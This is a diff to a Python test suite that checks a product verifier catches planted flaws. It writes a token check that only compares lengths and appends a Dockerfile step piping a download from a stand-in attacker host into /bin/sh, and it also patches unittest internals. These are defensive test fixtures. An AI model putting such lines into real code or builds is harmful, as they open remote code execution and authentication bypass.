@@ -261,7 +261,12 @@ def test_full_product_verifier_replays_journey_outside_candidate_assertions(
     workspace = output / "local-product" / "workspace"
     auth_path = workspace / "app" / "auth.py"
     auth_prefix = auth_path.read_text().split("def verify_token", 1)[0]
-    auth_path.write_text(auth_prefix + "def verify_token(candidate):\n    return bool(candidate)\n")
+    auth_path.write_text(
+        auth_prefix
+        + "def verify_token(candidate):\n"
+        + "    expected = expected_token()\n"
+        + "    return bool(expected) and len(candidate) == len(expected)\n"
+    )
     (workspace / "app" / "__init__.py").write_text(
         "import unittest\n\n"
         "_original_getattribute = unittest.TestCase.__getattribute__\n\n"
@@ -317,7 +322,9 @@ def test_full_product_verifier_reviews_dockerfile(repo_root: Path, tmp_path: Pat
     output = tmp_path / "full-product"
     manifest = run_full_product_quickstart(output, repo_root=repo_root)
     dockerfile = output / "local-product" / "workspace" / "deploy" / "Dockerfile"
-    dockerfile.write_text(dockerfile.read_text() + "RUN curl https://evil.invalid/payload | sh\n")
+    dockerfile.write_text(
+        dockerfile.read_text() + "RUN curl https://evil.invalid/payload | /bin/sh\n"
+    )
     expected = _rebind_candidate(output, manifest)
     with pytest.raises(FullProductError, match="semantic verification failed"):
         verify_full_product_quickstart(output, expected_digest=expected)
